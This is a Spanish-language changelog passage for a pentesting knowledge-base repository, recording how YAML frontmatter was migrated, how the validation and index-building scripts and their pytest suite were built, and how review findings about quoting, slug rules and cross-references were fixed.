- `yaml_scalar()` reescrito para usar `_needs_quoting()` y escapar `\` y `"` cuando quota.
- `yaml_array()` ahora delega cada item a `yaml_scalar()` para uniformar la lógica.

### Tests nuevos (37 casos via parametrize)
- `test_yaml_scalar_quotes_reserved_yaml_scalars` (16 casos paramétricos): No/no/NO, Yes/yes, true/True/TRUE, false, On/off, Y/n, null, None, ~. Cada uno verifica que el output empieza con `"`.
- `test_yaml_scalar_quotes_numbers` (9 casos): 123, 0, -7, 1.5, .5, 1e10, 0xFF, 0o777, 0b101.
- `test_yaml_scalar_plain_strings_unquoted`: "plain", "Hello World", "Foo (Bar)" no requieren quote.
- `test_yaml_scalar_empty_string_is_quoted`: `""` quotado para evitar resolución implícita a null.
- `test_yaml_scalar_rejects_non_string`: TypeError si recibe int.
- `test_build_frontmatter_round_trip` (9 casos paramétricos): emite frontmatter con title `No`, `Yes`, `True`, `null`, `123`, `1.5`, `Foo: "Bar"`, plain, complejo, parsea con yaml.safe_load, asserts que `title == original`. Esto cubre el escenario completo end-to-end.

### Estado tras ronda 4
- `bash scripts/check.sh` → all green.
- 103 tests passing (37 nuevos respecto a sesión 19i, mayormente paramétricos).
- 124/124 validate OK (no afecta data ya migrada porque ningún title existente caía en los casos reservados).
- `build_indexes --check` up to date.

## [2026-05-03] — Sesión 19i (Review crítico ronda 3)

Cuatro hallazgos del review ronda 3 sobre la sesión 19h. Los cuatro válidos. Aplicados con tests nuevos para cada bug de código.

### Hallazgo 1 (Media) — yaml_array generaba YAML inválido con comillas internas
- `migrate_frontmatter.py:yaml_array()` quotaba valores con caracteres YAML especiales pero NO escapaba comillas internas. Un title legacy `Foo: "Bar"` derivado a `aliases: ["Foo: "Bar""]` produce un YAML que PyYAML no parsea (token mismatch: el cierre `"` se interpreta antes de tiempo).
- **Fix**: `yaml_array()` ahora hace `v.replace('"', '\\"')` antes de quotar, consistente con `yaml_scalar()` que ya lo hacía. 2 tests nuevos: `test_yaml_array_escapes_internal_quotes` (verifica el escape literal y que PyYAML pueda parsear el output) y `test_yaml_array_with_aliases_derived_from_titled_quote` (caso end-to-end via build_frontmatter).
- En el inventario actual no había títulos con `"` interno, así que no afectaba data ya migrada. Es protección para futuras migraciones.

### Hallazgo 2 (Baja) — cross_validate iteraba string carácter por carácter
- Si el YAML traía `related: foo` (string) en lugar de `related: [foo]`, `validate_file` reportaba correctamente `related must be array`, pero `cross_validate` hacía `for slug in fm.get("related") or []:` lo cual itera la string como secuencia de caracteres `'f', 'o', 'o'` y reportaba 3 errores falsos. No rompía el exit code (ya había errors de tipo) pero ensuciaba el diagnóstico.
- **Fix**: `cross_validate` ahora hace `if not isinstance(related_val, list): related_val = []` antes de iterar. Mismo guard para `learning_refs`. 2 tests nuevos: `test_cross_validate_skips_non_list_related` y `test_cross_validate_skips_non_list_learning_refs`.

### Hallazgo 3 (Baja) — AGENTS.md mentía sobre git mv
- La sección "Slug = nombre de archivo" decía: "se preserva si renombras vía `git mv`". Eso contradice el validador, que exige `slug == path.stem`. Tras un `git mv`, el filename cambia pero el `slug:` dentro del frontmatter NO se auto-actualiza, así que el archivo queda en estado inválido hasta que se edite a mano.
- **Fix**: AGENTS.md aclara que después de `git mv` hay que actualizar el `slug:` a mano para que coincida con el nuevo filename, y describe el workflow `git mv old.md new.md && sed -i 's/^slug: old$/slug: new/' new.md && bash scripts/check.sh`. El validador detecta el drift con el mensaje `slug must equal filename without extension`.

### Hallazgo 4 (Baja) — CHANGELOG miscount
- Sesión 19h decía "62 tests passing (4 nuevos: slug validation x3, cross_validate x1)" pero la suite pasó de 57 a 62, son 5 tests nuevos: 4 de slug + 1 de cross_validate.
- **Fix**: corregido a "5 nuevos: slug validation x4, cross_validate failure x1".

### Estado tras ronda 3
- `bash scripts/check.sh` → all green.
- 66 tests passing (4 nuevos respecto a sesión 19h: 2 yaml_array + 2 cross_validate skip).
- 124/124 validate OK.
- `build_indexes --check` up to date.

## [2026-05-03] — Sesión 19h (Review crítico ronda 2)

Cuatro hallazgos del review ronda 2 sobre la sesión 19g. Los cuatro válidos. Aplicados con tests adicionales y un script de ritual para evitar el proceso fallado que disparó el primer hallazgo.

### Hallazgo 1 (Alta) — `build_indexes --check` estaba stale
- `inventario/meta/by-mitre.md` todavía listaba `fingerprinting-tecnologias-web-activo` bajo `T1592` aunque la data ya había sido fixeada a `mitre: [T1592.002]` en la sesión 19g.
- Causa raíz (proceso): tras fixear la data, no se re-corrió `build_indexes`. El CHANGELOG decía "up to date" pero no lo estaba.
- **Fix data**: regenerado `inventario/meta/by-mitre.md`.
- **Fix proceso**: nuevo script `scripts/check.sh` ejecuta `pytest + validate + build_indexes --check` en orden, falla en el primero. AGENTS.md workflow añade un nuevo "Paso 5 — Verificación pre-commit" que invoca este ritual; el actual paso 5 (CHANGELOG) pasa a ser paso 6.

### Hallazgo 2 (Media) — validate.py no enforzaba slug == filename
- La nueva convención "slug = filename sin extensión" estaba documentada en TEMPLATE.md y AGENTS.md, pero el validador sólo verificaba tipo y unicidad. Un archivo `analisis-sqli.md` con `slug: sqli` pasaría aunque contradice la convención.
- **Fix**: validator ahora exige `slug == path.stem` Y formato kebab-case via regex `^[a-z0-9]+(-[a-z0-9]+)*$`. 4 tests nuevos (`test_slug_must_equal_filename`, `test_slug_kebab_case_rejected_uppercase`, `test_slug_kebab_case_rejected_underscore`, `test_slug_kebab_case_passes_simple`).
- **Verificación**: 124/124 archivos siguen pasando (todos ya cumplen la convención porque la migración derivó slug de filename desde el inicio).

### Hallazgo 3 (Media) — cross_validate exception silenciaba errores globales
- El try/except defensivo capturaba el crash de `cross_validate`, imprimía "FATAL" pero el script seguía corriendo y exit code podía quedar 0 si no había errores per-file. CI no lo notaría.
- **Fix**: nueva flag `cross_failed` se setea en el except; si está, se imprime mensaje "marcando como failure" y sale con código 1. Test nuevo `test_main_exits_nonzero_when_cross_validate_crashes` inyecta un `cross_validate` roto y verifica `SystemExit.code == 1`.

### Hallazgo 4 (Baja) — Doc drift sobre learning_refs
- Docstring de `validate.py` decía "writeup.md o algún .md", AGENTS.md decía "o equivalente Markdown estructurado", aunque el código (post-ronda 1) ya exigía `writeup.md` exacto.
- **Fix**: docstring de `validate.py` actualizado a "estricto, ver Política learning_refs en AGENTS.md". AGENTS.md sección "Política learning_refs" reescrita: exige nombre exacto `writeup.md`, menciona explícitamente que material multi-capítulo (ej. tryhackme/abusingwindowsinternals/) debe consolidarse en un `writeup.md` que orqueste/linkee los chapters, y que el validador rechaza directorios sin él.

### Estado tras ronda 2
- `bash scripts/check.sh` → all green.
- 62 tests passing (5 nuevos respecto a sesión 19g: slug validation x4, cross_validate failure x1).
- 124/124 validate OK.
- `build_indexes --check` up to date.

## [2026-05-03] — Sesión 19g (Tests + bug encontrado por test)

Tras aplicar los fixes del review crítico, se construyó una suite de tests con pytest para los 3 scripts de tooling. Cubre: type-check defensivo, casos felices, regresiones específicas del review (plataforma como lista, title como int, related con int, learning_refs sin writeup.md, --check no toca filesystem).

### Suite de tests (`scripts/tests/`)
- `conftest.py`: fixtures `sandbox` (tmp_path con inventario/ y learning/) y `write_md` (helper que genera `.md` con frontmatter formateado correctamente). Añade `scripts/` al sys.path para imports.
- `test_validate.py` (23 tests): happy path, missing fields, enum invalidos, type checks defensivos, slug duplicado, title↔H1, MITRE format, mitre vacío sólo para conceptual, related dangling, learning_refs con/sin writeup.md, sección Clasificación residual.
- `test_migrate_frontmatter.py` (18 tests): yaml_scalar/yaml_array, extract_h1, extract_clasificacion (simple, compound fase, multilínea MITRE, MITRE en link markdown), happy path, skip si ya tiene frontmatter, dry-run no escribe, title con `:` quotado, mitre vacío sólo para conceptual, validación de enums.
- `test_build_indexes.py` (16 tests): short_title, render_table, collect_files exclusiones, regen_leaf_index (basic, idempotent, preserva narrativa, backlinks 1 y 2 niveles, sort por display title), build_topics, build_facet, --check no crea meta/, --check no modifica archivos, full run escribe.

### Bug encontrado por los tests
El test `test_extract_clasificacion_linked_mitre` falló al primer intento. Causa: `migrate_frontmatter.py` extraía T-IDs de cualquier parte del bloque MITRE incluyendo URLs de markdown links. Para `[T1592.002](https://attack.mitre.org/techniques/T1592/002/)` capturaba `T1592.002` (legítimo) y `T1592` (extraído del path del URL).

- Confirmado en datos reales: `inventario/02-enumeracion/web/fingerprinting-tecnologias-web-activo.md` tenía `mitre: [T1592.002, T1592]`.
- **Fix script**: pre-procesar el bloque MITRE reemplazando `[texto](url)` por `texto` antes de extraer T-IDs. Así URLs no contaminan la extracción.
- **Fix data**: corregido el archivo afectado a `mitre: [T1592.002]`.
- Otros archivos con T1XXX y T1XXX.NNN ambos (kerberos, bloodhound, pivoting-tunneling, process-injection) son intencionales: tienen multi-línea explícita con técnica padre + sub-técnicas distintas. No son afectados.

### Otros fixes menores
- `.gitignore` añade `__pycache__/`, `*.pyc`, `.pytest_cache/`. El commit anterior había incluido sin querer un `.pyc` que se untrackea aquí.

### Estado tras tests
- `python3 -m pytest scripts/tests/` → 57 passed in 0.12s.
- `python3 scripts/validate.py` → 124/124 OK.
- `python3 scripts/build_indexes.py --check` → up to date.

## [2026-05-03] — Sesión 19f (Fixes del review crítico de Sprint 2)

Pasada de fixes derivada de un review crítico externo del trabajo de Sprint 2. Cuatro hallazgos auditados, los cuatro corregidos. Discusión arquitectónica resuelta sobre la convención de slugs.

### Hallazgo 1 (Alta): doc drift en convención de slug
- TEMPLATE.md y AGENTS.md declaraban "análisis usa slug base (`sqli`), explotación usa `<slug>-explotacion` (`sqli-explotacion`)" pero la realidad implementada era `slug = filename sin extensión` (`analisis-sqli`, `explotacion-sqli`).
- **Decisión arquitectónica**: alinear docs a la implementación, no al revés. Razones: slug=filename es derivable mecánicamente, invariante con `git mv`, y la "regla base+suffix" generaba ambigüedad para pares no-clásicos (pasivo/activo no tiene "base" obvio). Búsqueda por tópico cruzando fases vía `find inventario -name "*-sqli.md"` o `grep -rlE "^slug: .*[-_]sqli($|[-.])"`. Trade-off aceptado: un grep ligeramente más complejo a cambio de cero ambigüedad mental.
- **Cambios**: TEMPLATE.md notas 1 y 2 reescritas. AGENTS.md sección "Pares cross-fase" y cookbook actualizados para reflejar la convención real.

### Hallazgo 2 (Media): validate.py crasheaba con YAML mal tipado
- `plataforma: [Web]` (lista en lugar de string) provocaba `TypeError: unhashable type: 'list'` al evaluar `plat not in PLATAFORMA_VALID`. Title no-string fallaba en `.strip()`. Un solo archivo malformado abortaba todo el run.
- **Fix**: type checks defensivos por campo. Cada error se reporta como `plataforma must be string, got list` y el run continúa con los siguientes archivos. Red de seguridad adicional: `try/except` en el loop principal de `main()` captura cualquier edge case que escape los type checks y lo reporta sin abortar.
- **Verificación**: tests sintéticos con `plataforma: [Web]`, `title: 42`, `related: [123, "valid"]` producen mensajes de error claros, todos los archivos siguen procesándose.

### Hallazgo 3 (Media): tipos internos de related/learning_refs + writeup.md strict
- `related: [123, "foo"]` rompía `slug not in all_slugs` con TypeError. `learning_refs: [123]` rompía `LEARNING / 123`.
- **Fix 3a**: type-check de items dentro de los arrays. Items no-string se reportan como error y se saltan en cross-validation (en lugar de crashear).
- **Fix 3b**: la política en AGENTS.md exigía writeup.md o equivalente Markdown estructurado, pero el validador aceptaba cualquier `*.md`. Ahora exige `writeup.md` específicamente. Razón: las directorios de course material multi-capítulo (como `tryhackme/abusingwindowsinternals/`) ya tienen writeup.md consolidado; esta política fuerza a futuros writeups a hacer lo mismo en lugar de aceptar fragmentos sueltos.
- **Verificación**: las 4 archivos del inventario con learning_refs apuntan a dirs con writeup.md y siguen pasando. Test sintético con dir conteniendo sólo `notes.md` produce error: `learning_refs path missing writeup.md`.

### Hallazgo 4 (Baja): build_indexes.py --check tocaba filesystem
- `META_DIR.mkdir(exist_ok=True)` se ejecutaba incondicionalmente, creando `inventario/meta/` aunque el modo `--check` declarara no modificar nada.
- **Fix**: mover `META_DIR.mkdir` dentro de la rama `if not args.check`. CI puede ahora correr `build_indexes.py --check` sobre un repo limpio sin ensuciar el árbol.

### Estado tras fixes
- `python3 scripts/validate.py` → 124/124 OK.
- `python3 scripts/build_indexes.py --check` → up to date, no filesystem changes.
- 0 archivos del inventario afectados (los fixes son sólo en docs y scripts).
- Tests defensivos pasan: validador no crashea con YAML mal tipado.

## [2026-05-03] — Sesión 19e (Enriquecimiento de aliases + related + learning_refs)

Pasada de enriquecimiento sobre 39 topics frecuentes para que las búsquedas por sinónimo y la cross-referencia entre fases funcionen. Aplicado vía script one-shot inline.

### Topics enriquecidos (39 archivos)
- **Web**: analisis-sqli ↔ explotacion-sqli, analisis-xss, analisis-csrf, analisis-cors, analisis-idor, analisis-ssrf, analisis-xxe, analisis-ssti, analisis-lfi-rfi, analisis-deserialization ↔ explotacion-deserialization, explotacion-nosqli, explotacion-jwt, explotacion-auth-bypass-oauth, explotacion-fileupload.
- **Red/AD**: enumeracion-kerberos (Kerberoasting, AS-REP Roasting, GetUserSPNs, GetNPUsers), enumeracion-ldap, enumeracion-smb (enum4linux, smbclient, CIFS), enumeracion-nfs, enumeracion-snmp, enumeracion-dns.
- **Fuzzing**: fuzzing-directorios-archivos (gobuster, ffuf, dirsearch), fuzzing-subdominios-vhosts, fuzzing-parametros (Arjun, ParamMiner), fuzzing-lfi-ssrf.
- **Post-Explotación**: pass-the-hash (PtH), credential-dumping (mimikatz, LSASS dump, DCSync, DPAPI), bloodhound (SharpHound, AD attack paths), ejecucion-remota-windows (psexec, wmiexec, atexec).
- **DBs**: enumeracion-mssql (xp_cmdshell), enumeracion-mysql (MariaDB), enumeracion-mongodb.
- **Frameworks**: metasploit-avanzado (msfconsole, msfvenom), configuracion-uso-avanzado (Burp Proxy/Repeater/Intruder), empire-framework (Starkiller).
- **Sistema**: explotacion-eternalblue (MS17-010), explotacion-zerologon (CVE-2020-1472), explotacion-shellshock.

### Cross-references añadidas
- `related:` en cada par cross-fase listado mutuamente (analisis-sqli ↔ explotacion-sqli, etc.).
- `related:` cross-categoría en topics que cruzan disciplinas (kerberos ↔ ldap ↔ smb ↔ bloodhound; jwt ↔ oauth-bypass; fuzzing ↔ topics web).

### `learning_refs:` añadidos
- 6 archivos del inventario referencian writeups de `learning/portswigger/`:
  - **SQLi (analisis + explotacion)**: 5 labs (visible-error-based, blind-time-delays, blind-time-delays-info-retrieval, blind-out-of-band, sqli-filter-bypass-xml-encoding).
  - **XSS (analisis)**: 4 labs (reflected-xss-canonical-link-tag, reflected-xss-js-string-angle-quotes-encoded, reflected-xss-js-string-sq-backslash-escaped, stored-xss-onclick-html-entity-bypass).
  - **CSRF (analisis)**: 1 lab (samesite-lax-bypass-via-cookie-refresh).

### Fix derivado
- `scripts/validate.py` ahora excluye `inventario/meta/` y `inventario/TOPICS.md` (auto-generados sin frontmatter).

### Estado tras enriquecimiento
- `python3 scripts/validate.py` → 124/124 OK con cross-references resueltas.
- `python3 scripts/build_indexes.py --check` → up to date (TOPICS.md regenerado para reflejar nuevas aliases/related/learning_refs).
- Discoverabilidad por sinónimo funciona: `grep -lE "^aliases:.*Kerberoasting"` encuentra `enumeracion-kerberos.md`, `grep -lE "^aliases:.*\bPtH\b"` encuentra `pass-the-hash.md`, etc.
- Pares cross-fase siempre se encuentran mutuamente vía `related:` (ej. desde explotacion-sqli puedes saltar a analisis-sqli y a los 5 writeups PortSwigger).

## [2026-05-03] — Sesión 19d (Sprint 2: validate.py + build_indexes.py)

Sprint 2 del plan de discoverabilidad. Tooling para validar la integridad del frontmatter y regenerar índices automáticamente.

### `scripts/validate.py` (nuevo)
- Valida los 124 archivos técnicos del inventario contra el schema documentado en TEMPLATE.md y AGENTS.md.
- Comprueba: presencia de frontmatter, parseable como YAML, campos requeridos (title, slug, aliases, fase, plataforma, dificultad, mitre), tipos y enums correctos, slugs únicos globalmente, paridad entre `title` del frontmatter y H1 del body, formato MITRE `T\d{4}(\.\d{3})?`, vacío permitido en `mitre` sólo si fase es Fundamentos o Forense y DFIR, ausencia de sección `## Clasificación` en el body, y resolución cruzada de `related` (cada slug existe) y `learning_refs` (cada path existe en learning/ y contiene .md).
- Salida: `ERR <path>: <descripción>` por cada problema, código de salida 0/1.

### `scripts/build_indexes.py` (nuevo)
- Regenera los **29 INDEX.md hoja** desde frontmatter. Tabla `Técnica | MITRE | Dificultad | Plataforma`, ordenada alfabéticamente por nombre mostrado, con backlink correcto a cada fase (acentos preservados en "Análisis de Vulnerabilidades", "Explotación", etc.).
- Genera nuevo **`inventario/TOPICS.md`**: índice plano por slug con archivo, fase, plataforma, dificultad, aliases, related (como slugs) y learning_refs (con links a learning/).
- Genera nuevo **`inventario/meta/`** con vistas facetadas auto-generadas: `by-mitre.md`, `by-difficulty.md`, `by-platform.md`, `by-fase.md`. Cada una agrupa los 124 archivos por el valor del facet correspondiente.
- Idempotente: el marcador `<!-- AUTOGENERADO por scripts/build_indexes.py. NO editar a mano la tabla. -->` delimita la zona generada; la narrativa antes del marcador (H1 + descripción de la subcategoría) se preserva inalterada.
- Modo `--check` para integración con CI/git hooks: falla si los archivos están desactualizados sin escribirlos.

### Fixes derivados
- 22 archivos con título conteniendo `:` rompían el parsing YAML. Fix one-shot quotó los títulos: `title: "Análisis de Vulnerabilidades: SQL Injection (SQLi)"`. El script `migrate_frontmatter.py` ahora cita preventivamente cualquier scalar con caracteres YAML especiales (`:`, `#`, `&`, `*`, `!`, `|`, `>`, `%`, `@`, `` ` ``).
- 2 archivos de Fase 01 (`deteccion-waf.md`, `transparencia-certificados.md`) tenían title del frontmatter más corto que el H1 del body. Sincronizados al H1 (la versión larga es la canónica para humanos).

### Estado tras Sprint 2
- `python3 scripts/validate.py` → 124/124 OK.
- `python3 scripts/build_indexes.py --check` → up to date.
- Discoverabilidad LLM: queries por slug, fase, plataforma, dificultad y MITRE funcionan vía grep sobre frontmatter; vistas facetadas en `inventario/meta/` permiten lookup directo sin grep; TOPICS.md da una vista por tema cruzada.
- Pendiente sólo: enriquecimiento manual de aliases/related para topics frecuentes (búsqueda por sinónimo como "Kerberoasting" todavía no encuentra el archivo correspondiente porque sus aliases son auto-derivados de title).

## [2026-05-03] — Sesión 19c (Sprint 1: frontmatter YAML en Fases 02-08)

Continuación de la sesión 19b. Tras validar el patrón en Fase 01, se construyó un script de migración para procesar las fases 02-08 sin escribir frontmatter a mano por 111 archivos.

### Script `scripts/migrate_frontmatter.py` (nuevo)
- Parsea el bloque `## Clasificación` existente, extrae title (del H1), fase (split coma+espacio), plataforma, dificultad, y mitre (regex sobre todo el bloque MITRE para soportar multi-IDs en una línea o multilínea con bullets indentados).
- Deriva slug del nombre de archivo (sin extensión).
- Genera frontmatter YAML al inicio con aliases default `[title]`, related y learning_refs default `[]`.
- Elimina la sección `## Clasificación` del body.
- Idempotente: salta archivos que ya tienen frontmatter (los 13 de Fase 01).
- Permite `mitre: []` para contenido conceptual cuya fase incluye `Fundamentos` o `Forense y DFIR` (modelos teóricos, PICERL, fundamentos de redes/sistemas no tienen mapping limpio a MITRE).

### Migración aplicada
- 111 archivos migrados a frontmatter YAML (fases 02-08).
- 13 archivos saltados (Fase 01, ya migrada manualmente en sesión 19b).
- Total: 124 archivos técnicos con frontmatter, 0 con `## Clasificación` en body, 124 slugs únicos.

### Conflicto de slug resuelto
- `inventario/02-enumeracion/web/fingerprinting-tecnologias-web.md` colisionaba en slug con `inventario/01-reconocimiento/pasivo/fingerprinting-tecnologias-web.md` (mismo nombre de archivo en distintas fases). Renombrado vía `git mv` a `fingerprinting-tecnologias-web-activo.md` para alinear con la convención "base + modifier" descrita en AGENTS.md. Slug actualizado a `fingerprinting-tecnologias-web-activo`. Cross-link en el archivo pasivo y enlace en `02-enumeracion/web/INDEX.md` actualizados. `aliases` y `related` enriquecidos manualmente para este archivo en particular (incluye WhatWeb, httpx, Wappalyzer CLI; relacionado con la versión pasiva, banner-grabbing-http, deteccion-waf).

### Verificación
- `find inventario -name "*.md" -not -name INDEX.md -exec grep -l "^slug: " {} \; | wc -l` → 124.
- `find inventario -name "*.md" -not -name INDEX.md -exec grep -h "^slug: " {} \; | sort | uniq -d` → 0 duplicados.
- `grep -rl "^## Clasificación" inventario/` → 0 archivos.
- Distribución por plataforma: 12 Linux, 21 Windows, 37 Web, 6 Red, 48 Multi (suma 124).
- Queries facetadas funcionan: T1190 devuelve 10+ archivos web, intersección Avanzada+Web devuelve 5 archivos esperados, slugs con sustring `sqli` devuelve los 3 archivos relacionados (analisis-sqli, explotacion-sqli, explotacion-nosqli).

### Limitación conocida (deuda para enriquecimiento posterior)
- `aliases:` para los 111 archivos migrados por script contiene únicamente `[title]`. Búsquedas por sinónimo (ej. "Kerberoasting", "PtH") no encuentran los archivos correspondientes hasta que se enriquezcan a mano. Es una decisión consciente: el script no infiere aliases para no introducir ruido. La discoverabilidad por slug, fase, plataforma, dificultad y MITRE sí funciona.
- `related:` está vacío para los 111 archivos migrados por script. Las relaciones cross-fase (analisis-sqli ↔ explotacion-sqli, etc.) deben añadirse a mano en una pasada de enriquecimiento posterior.
- Sprint 2 (validate.py + build_indexes.py) sigue pendiente y detectará dangling refs cuando se enriquezca related.

## [2026-05-03] — Sesión 19b (Sprint 1 piloto: frontmatter YAML en Fase 01)

Continuación de la sesión 19. Sprint 1 del plan de discoverabilidad ejecutado en Fase 01 (Reconocimiento) como piloto antes de escalar a fases 02-08.

### TEMPLATE.md reescrito
- Frontmatter YAML añadido como bloque obligatorio al inicio (10 campos: title, slug, aliases, fase, plataforma, dificultad, mitre, related, learning_refs).
- Sección `## Clasificación` eliminada del body — el frontmatter es ahora la fuente única de verdad para la metadata.
- Comentario HTML al final ampliado: 10 notas que documentan cada campo del frontmatter, las reglas de pares cross-fase (slug base vs `<slug>-explotacion`), y las reglas de arrays siempre para `fase`/`mitre`.

### AGENTS.md actualizado
- Sección "Formato de cada Técnica" reescrita: ejemplo de bloque incluye frontmatter al inicio, tabla con tipo y obligatoriedad de cada campo, regla de slugs distintos para pares análisis/explotación cross-fase.
- "Cookbook de Búsqueda" actualizado con queries sobre frontmatter (`grep -lE "^slug: sqli$"`, `grep -lE "^mitre:.*\bT1190\b"`, intersecciones via xargs). Nota legacy para fases aún no migradas.
- Instrucciones del agente `revisor` ampliadas para validar frontmatter (campos requeridos, enums, arrays, formato MITRE, paridad title↔H1) y prohibir explícitamente la sección `## Clasificación` en el body.

### Fase 01 migrada (13 archivos)
- 5 archivos en `activo/`: descubrimiento-hosts, deteccion-waf, escaneo-puertos, escaneo-vulnerabilidades, fingerprinting-os-servicios.
- 8 archivos en `pasivo/`: dns-pasivo, fingerprinting-tecnologias-web, google-dorking, recoleccion-emails, shodan-censys, transparencia-certificados, wayback-machine, whois-registros-dominio.
- Cada archivo recibió frontmatter con slug único, aliases derivados del título y herramientas mencionadas, mitre como array (preservando sub-técnicas, ej. `[T1018, T1595.001]`), y `related:` con slugs de Fase 01 (algunos cross-fase como `enumeracion-dns` o `fingerprinting-tecnologias-web-activo` quedan pendientes de resolver hasta que las fases 02+ se migren — el validador del Sprint 2 los detectará si quedan dangling).
- Sección `## Clasificación` eliminada del body en los 13 archivos. Las otras 5 secciones (Descripción, Herramientas, Comandos, Contramedidas, Referencias) intactas.

### Queries de verificación (todas pasan)
- `grep -lE "^## Clasificación" inventario/01-reconocimiento/**/*.md` → 0 resultados.
- 13 slugs únicos en Fase 01.
- `grep -lE "^dificultad: Intermedia$"` y otras queries facetadas devuelven los archivos esperados.

### Pendiente para sesiones siguientes
- Sprint 1 fases 02-08 (~111 archivos restantes).
- Sprint 2: `scripts/validate.py` y `scripts/build_indexes.py` para garantizar que `related:` resuelve, slugs son únicos globalmente, y los 40 INDEX.md hoja se regeneran desde frontmatter.

## [2026-05-03] — Sesión 19 (Sprint 0 del plan de discoverabilidad LLM-first)

Primer sprint del plan de mejoras de discoverabilidad (`~/.claude/plans/ok-haz-un-plan-sequential-parnas.md`). Sprint 0 abarca naming + documentación; Sprints 1-2 (frontmatter YAML + tooling) llegan en sesiones siguientes.

### Renombrado
- `inventario/03-analisis-vulnerabilidades/web/analisis-sql-injection.md` → `analisis-sqli.md`. Razón: alinear con el par `04-explotacion/web/explotacion-sqli.md` y con la convención de naming recién documentada (acrónimo establecido en lugar de palabra completa). Era la única inconsistencia cross-fase del inventario tras auditar todos los pares topic. Historia preservada vía `git mv`. Referencias activas actualizadas en el INDEX correspondiente y en 5 writeups de `learning/portswigger/` (visible-error-based, blind-time-delays, blind-time-delays-info-retrieval, blind-out-of-band, sqli-filter-bypass-xml-encoding). Las menciones históricas en este CHANGELOG se dejaron intactas por fidelidad temporal.

### Documentación añadida en `AGENTS.md`
- **Sección "Convención de Naming de Archivos"**: codifica el patrón `<prefijo-acción>-<slug>.md`, mapeo de prefijo por fase (`analisis-` para 03, `explotacion-` para 04, `enumeracion-` para 02, `abuso-`/sin-prefijo en 05 según el caso, sin prefijo en 06-08), regla de "usar acrónimo establecido" con tabla de slugs canónicos (sqli, xss, csrf, ssrf, idor, lfi-rfi, xxe, ssti, jwt, nosqli, adcs), y regla de paridad entre pares cross-fase.
- **Sección "Cookbook de Búsqueda"**: ~10 patrones de grep que un agente puede ejecutar para localizar técnicas sin recorrer la jerarquía de INDEX (find por slug, grep por dificultad/plataforma/MITRE/fase/herramienta/autor de referencia). Anota que el cookbook cambiará tras la migración a frontmatter YAML.
- **Sección "Política `learning_refs`"**: define qué cuenta como writeup linkeable (directorio con `writeup.md` estructurado) vs scratch (scripts sueltos, wordlists, fragmentos de curso). Sirve de guía para el Sprint 1 del plan, cuando los archivos del inventario ganen el campo `learning_refs:` en frontmatter.

### Auditoría sin cambios
- Pares cross-fase verificados con `diff` entre `03/web` y `04/web`: SQLi era la única inconsistencia. `deserialization` ya estaba alineado. No hay otros pares que requieran rename.
- Contenido de `learning/`: clasificado en linkeable (10 labs PortSwigger + `tryhackme/abusingwindowsinternals/`) vs no-linkeable (8 directorios de scripts en TryHackMe + archivos sueltos). No se movió nada físicamente — la política de `learning_refs` filtra a nivel de referencias.

## [2026-05-03] — Sesión 18 (Mantenimiento de consistencia tras review crítico)

Sesión de mantenimiento estructural disparada por review crítico de un agente externo. Se auditó cada hallazgo contra el repo, se calibraron severidades, se discutió y aprobó la decisión arquitectónica de **secciones opcionales en TEMPLATE** en lugar de un template alterno para contenido conceptual, y se aplicaron todos los fixes derivados.

### Cambios estructurales en TEMPLATE.md
- **Secciones opcionales**: Herramientas, Comandos / Ejemplos y Contramedidas pasan a opcionales para contenido conceptual o metodológico (modelos teóricos, ciclos, marcos). Las técnicas y herramientas concretas las siguen requiriendo. Documentado en nota 9 del comentario.
- **Valores compuestos en Fase**: separador estandarizado a coma+espacio. Permitidos para herramientas/técnicas que genuinamente cruzan fases. Plataforma sigue estricta. Documentado en notas 7 y 8.
- **Nota sobre MITRE ATT&CK**: ampliada para reconocer la limitación conocida de ATT&CK en el dominio de seguridad de aplicaciones (CSRF, IDOR, race conditions sin mapping limpio). Se establece T1190 como ID por defecto defensible.

### Fixes aplicados al inventario
- **MITRE incorrectos corregidos** (T1190 con link al ATT&CK):
  - `analisis-csrf.md`: T1185 (Browser Session Hijacking, no aplica a CSRF) → T1190.
  - `analisis-idor.md`: T1213 (Data from Information Repositories, no aplica a IDOR) → T1190.
- **Valores compuestos migrados a sintaxis de coma+espacio**:
  - `enumeracion-kerberos.md`: `Enumeración / Post-explotación` → `Enumeración, Post-Explotación`.
  - `bloodhound.md`: `Reconocimiento | Post-Explotación` → `Reconocimiento, Post-Explotación`. `Plataforma: Windows | Linux (interfaz)` → `Plataforma: Windows` (la nota cross-plataforma sobre GUI/agentes movida a Descripción, que es donde corresponde según TEMPLATE nota 7).
- **Acentos corregidos en 14 archivos de `01-reconocimiento/`** (toda la fase 1, escrita en algún momento sin acentos y nunca normalizada). Headers (`Descripción`, `Clasificación`) y cuerpo entero. Aplicado vía sed con script de patrones de alta confianza (palabras técnicas en español que casi siempre llevan acento). Tres pasadas, residuales finales (`deteccion`, `enumeracion`, `recoleccion`) son nombres de archivo en INDEX.md y son correctos así.
- **Referencias de libros del directorio `referencias/` añadidas a 5 archivos** que sólo citaban libros externos:
  - `modelo-osi-tcp-ip.md`: + Casad (TCP/IP in 24 Hours).
  - `volatility-memoria.md`, `picerl.md`, `artefactos-windows-host.md`: + Johansen (Digital Forensics and Incident Response).
  - `analisis-estatico-dinamico.md`: + Harper et al. (Gray Hat Hacking) por sus capítulos de análisis de malware.

### Consolidación de duplicados
- **DNS**: `01-reconocimiento/activo/enumeracion-dns.md` borrado. Su contenido único (NSEC walking, DNS cache snooping, amass active mode, ldns-walk como herramienta) se mergeó dentro de `02-enumeracion/red/enumeracion-dns.md` en una nueva subsección "Técnicas avanzadas". Las contramedidas correspondientes (NSEC3, limitar recursión, rate limiting) añadidas al bloque de defensas. INDEX.md de reconocimiento activo actualizado con nota redirigiendo al archivo canónico de enumeración. Razón estructural: la enumeración DNS activa (consultas directas al DNS del objetivo) es operacionalmente fase 2 (Enumeración), no fase 1 (Reconocimiento). El reconocimiento DNS pasivo (sin tocar al objetivo) sigue en `01-reconocimiento/pasivo/dns-pasivo.md`.
- **Fingerprinting**: ambos archivos (`01-reconocimiento/pasivo/` y `02-enumeracion/web/`) **reescritos completos** para delinear claramente pasivo vs activo. La versión pasiva enfoca BuiltWith, Wappalyzer extensión, Stackshare, Retire.js sobre JS local descargado, OSINT vía shodan/censys. La versión activa enfoca WhatWeb, httpx, Wappalyzer CLI, nmap NSE, curl probing, detección activa de Kubernetes/Docker/Envoy. Cross-references explícitas en ambos. Acentos arreglados en la versión activa.

### Documentación
